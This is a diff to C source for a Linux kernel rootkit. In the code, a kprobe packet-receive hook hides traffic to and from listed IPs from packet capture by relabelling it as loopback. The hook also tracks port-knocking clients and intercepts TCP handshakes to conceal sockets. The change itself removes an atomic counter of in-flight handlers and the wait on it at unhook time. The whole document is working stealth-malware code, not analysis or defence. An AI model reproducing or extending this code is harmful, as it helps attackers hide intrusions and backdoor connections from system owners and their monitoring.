@@ -77,7 +77,6 @@ unhide_packets(void)
         unregister_kprobe(&p_rcv);
         unregister_kprobe(&tp_rcv);
         unregister_kprobe(&p_rcv_spkt);
-        while (atomic_read(&packet_rcv_count) > 0);
     }
 }
 
@@ -130,8 +129,6 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
     struct sk_buff *clone = skb_clone(skb, GFP_KERNEL);
     pt_regs->di = (long unsigned int)clone;
 
-    atomic_inc(&packet_rcv_count);
-
     if (ver == 0x60) {
         struct ipv6hdr *iphdr;
 
@@ -158,10 +155,8 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
                 || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v4))
                 clone->pkt_type = PACKET_LOOPBACK;
         }
-    } else {
-        atomic_dec(&packet_rcv_count);
+    } else
         return 0;
-    }
 
     if (rootkit.hiding_sockets) {
         // We need to intercept (RST) the TCP handshake
@@ -171,10 +166,8 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
             tcphdr = (struct tcphdr *)skb_transport_header(skb);
             unsigned src_port = (unsigned)ntohs(tcphdr->source);
 
-            if (list_contains_knock(&ips_stage3, ip, version)) {
-                atomic_dec(&packet_rcv_count);
+            if (list_contains_knock(&ips_stage3, ip, version))
                 return 0;
-            }
 
             if (tcphdr->syn || !tcphdr->ack)
                 goto check_port;
@@ -215,7 +208,6 @@ check_port:
         }
     }
 
-    atomic_dec(&packet_rcv_count);
     return 0;
 }
 
